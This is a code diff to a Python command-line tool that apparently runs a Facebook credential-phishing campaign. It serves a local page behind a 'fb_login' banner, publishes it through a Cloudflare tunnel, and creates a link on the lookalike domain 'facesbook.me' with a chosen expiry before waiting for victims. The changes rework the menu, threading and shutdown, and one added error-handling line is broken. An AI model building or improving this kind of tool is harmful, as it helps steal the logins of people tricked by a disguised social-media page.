@@ -1,4 +1,3 @@
-# from ..zynn import small_title_fb,clear_terminal
 import os
 import shutil
 import re
@@ -25,6 +24,7 @@ from scripts.install import install_cloudflared
 from controllers.Controller import MyHandler
 import socket
 import platform
+import sys
 
 red='red'
 green='green'
@@ -32,7 +32,7 @@ yellow='yellow'
 
 def clear_terminal():
     os.system('cls' if os.name == 'nt' else 'clear')
-
+    
 def small_title_fb():
     clear_terminal()
     fb_login = """
@@ -76,21 +76,44 @@ def setup_server(filepath):
   small_title_setup_server()
   type_port(filepath)
 
+def choice_server(httpd_thread, httpd, port):
+    try:
+      menu_text = """
+   1 -> Cloudflare
+   2 -> Back
+     """
+      print_colored_text_with_animation(menu_text, color=green, delay=0.03)
+      user_choice = input('\033[32mSelect server:\033[0m ')
+  
+      if user_choice == '1':
+        install_cloudflared(httpd, port)
+        start_cloudflared(httpd, port)
+      elif user_choice == '2':
+           from zynn import main
+           try:
+              httpd.shutdown()
+              httpd_thread.join()
+           except Exception as e:
+             print(f"Error during shutdown: {e}")
+           main()
+      else:
+           clear_terminal()
+           small_title_setup_server()
+           print(colored('\nInvalid choice. Please select a valid option.', color='red'))
+           choice_server(httpd_thread, httpd, port)
+    #    elif user_choice == '2':
+    #       start_ngrok(httpd, port)
+    except KeyboardInterrupt:
+       httpd.shutdown()
+       httpd.server_close()
+       clear_terminal()
+
 def start_server(port,filepath):
   with socketserver.TCPServer(("", int(port)),  lambda *args, **kwargs: MyHandler(*args, filepath=filepath, **kwargs)) as httpd:
-    menu_text = """
-  [1] Cloudflare (Recommend)
-  [3] Exit
-     """
-    print_colored_text_with_animation(menu_text, color=green, delay=0.03)
-    user_choice = input('\033[32mSelect server:\033[0m ')
-
-    if user_choice == '1':
-       install_cloudflared(httpd, port)
-       start_cloudflared(httpd, port)
-    # elif user_choice == '2':
-    #    start_ngrok(httpd, port)
-
+    print(colored("\nServing at localhost:" + port, color=green))
+    httpd_thread = threading.Thread(target=httpd.serve_forever)
+    httpd_thread.start()
+    choice_server(httpd_thread,httpd, port)
 
 def start_ngrok(httpd, port):
     try:
@@ -99,7 +122,10 @@ def start_ngrok(httpd, port):
         print("    Serving at localhost:" + port)
         link_created = False
         if public_url and not link_created:
-                fb_url, expiration, error = make_fb_link(public_url)
+                try:
+                  fb_url, expiration, error = make_fb_link(public_url)
+                except:
+                  fb_url, expiration, error = None
                 if not error:
                    formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
                    small_title_fb()
@@ -156,20 +182,20 @@ def start_cloudflared(httpd, port):
   
     link_created = False
 
-    # try:
-        # Run the server in a separate thread
-    print(colored("\nServing at localhost:" + port + "\n", color=green))
-    
-    httpd_thread = threading.Thread(target=httpd.serve_forever)
-    httpd_thread.start()
-    # Wait for the Cloudflared tunnel to be established
-    while True:
+    try:
+      while True:
         with open(cloudflared_log_path, 'r') as log_file:
             log_contents = log_file.read()
             match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents)
             if match and not link_created:
                 cldflr_url = match.group(0)
-                fb_url, expiration, error = make_fb_link(cldflr_url)
+                try:
+                  fb_url, expiration, error = make_fb_link(cldflr_url)
+                except:
+                  print(f"\n\033[32mfacesbook.me Url: ERROR")
+                  print(f"\n\033[32mfacesbook.me Expire in: ERROR")
+                  print(f"\n\033[32mCloudflared Url: \033[0m\033[34m{cldflr_url}\033[0m")
+                  return
                 if not error:
                 #    formatted_expiration = expiration.strftime("%Y-%m-%d %I:%M:%S %p")
                    current_time = datetime.now(timezone.utc)  # Current time with UTC timezone
@@ -184,34 +210,36 @@ def start_cloudflared(httpd, port):
                    
                    formatted_remaining_time = "{:02}d {:02}h {:02}m {:02}s".format(days, hours, minutes, seconds)
                    small_title_fb()
-                   print(f"Formatted Expiration: {expiration.strftime('%Y-%m-%d %I:%M:%S %p %Z')}")
-                   print(f"Time Remaining: {formatted_remaining_time}")
                    print(f"\n\033[32mfacesbook.me Url: \033[0m\033[34m{fb_url}\033[0m")
-                #    print(f"\n\033[32mfacesbook.me Expire Time: \033[0m\033[33m{formatted_remaining_time}\033[0m")
+                   print(f"\n\033[32mfacesbook.me Expire in: \033[0m\033[33m{formatted_remaining_time}\033[0m")
                    print(f"\n\033[32mCloudflared Url: \033[0m\033[34m{cldflr_url}\033[0m")
                    print(f"\n\033[32mWaiting For users... \033")
                    link_created = True
-                   def check_expiration():
-                       while True:
-                           # Get the current time in the user's timezone
-                           user_timezone = get_localzone()
-                           current_time = datetime.now(user_timezone)
-               
-                           # Check if the expiration time has passed
-                           if current_time > expiration:
-                               print(colored("\nWarning: facesbook.me link has expired.but you can use the cloudflared link", color=yellow))
-                               break
-                           # Sleep for a certain interval (e.g., 1 minute)
-                           time.sleep(60)
-               
-                   # Start a new thread to check expiration
-                   expiration_thread = Thread(target=check_expiration)
-                   expiration_thread.start()
+                   
+                #    def check_expiration():
+                #               while True:
+                #                   # Get the current time in the user's timezone
+                #                   user_timezone = get_localzone()
+                #                   current_time = datetime.now(user_timezone)
+                      
+                #                   # Check if the expiration time has passed
+                #                   if current_time > expiration:
+                #                       print(colored("\nWarning: facesbook.me link has expired, but you can use the cloudflared link", color='yellow'))
+                #                       break
+                      
+                #                   # Sleep for a certain interval (e.g., 1 minute)
+                #                   time.sleep(60)
+                #    expiration_thread = Thread(target=check_expiration)
+                #    expiration_thread.start()
+
                 else:
                    clear_terminal()
                    print(colored(f"\nError: {error}", color=red))
                    start_cloudflared(httpd, port)
-        
+    except KeyboardInterrupt:
+       httpd.shutdown()
+       httpd.server_close()
+       clear_terminal()
 
 def make_fb_link(url):
     expire_time = input(f'{colored("Enter Expire time for facesbook.me (1 = 1 minute, max: 60 minutes):", color=green )}')
